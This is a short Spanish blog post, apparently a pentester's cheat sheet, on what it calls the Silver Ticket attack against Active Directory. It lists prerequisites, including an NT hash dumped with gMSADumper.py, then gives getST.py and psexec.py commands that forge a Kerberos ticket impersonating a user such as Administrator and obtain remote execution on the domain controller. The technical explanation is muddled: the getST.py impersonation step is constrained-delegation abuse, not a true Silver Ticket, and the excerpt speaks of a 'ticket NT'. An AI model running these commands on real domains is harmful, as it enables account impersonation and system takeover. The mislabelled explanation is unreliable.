---
layout: single
title: Silver Ticket
excerpt: "El ataque Silver Ticket Attack consiste en craftear un tiket TGS válido mediante la disposición de un ticket NT válido para un usuario que pertenezca al gMSA (Group Managed Service Accounts)."
date: 2021-11-29
classes: wide
header:
  teaser: /assets/images/Tools/bash-icon.png
  teaser_home_page: true
  icon: /assets/images/tool.png
categories:
  - Tools
tags:
  - CLI
  - Active Directory

---


# Definición

The Silver ticket attack is based on **crafting a valid TGS for a service once the NTLM hash of service is owned** (like the **PC account hash**). Thus, it is possible to **gain access to that service** by forging a custom TGS **as any user**.

# Explotación
## Requisitos 
 * User 
 * UserToImpersonate (Administrator?)
 * Hash NT
	 * Podemos obtenerlo con la herrramienta gMSADumper.py, con credenciales válidas al AC.
 * Dominio
 * IP del dominio
 * Service Principal Name (spn)
	 *  Podemos obtenerlo con Bloodhound-Python en \*\_computers.json, en la sección "allowedtodelegate"


## getST.py
```bash
getST.py -spn <spn> -impersonate <UserToImpersonate> -hashes :<Hash NT> -dc-ip <IP del dominio> <Dominio>/<User>
```

Esto guardará un ticket en el archivo \<UserToImpersonate>.ccache

## psexec.py

```bash
KRB5CCNAME=<UserToImpersonate>.ccache psexec.py <Dominio>/<UserToImpersonate>@<IP del dominio> -no-pass -k
```

De esta forma habríamos impersonalizado al usuario.


---

Escrito el 29-11-2021 a las 04:13 pm por creep33.
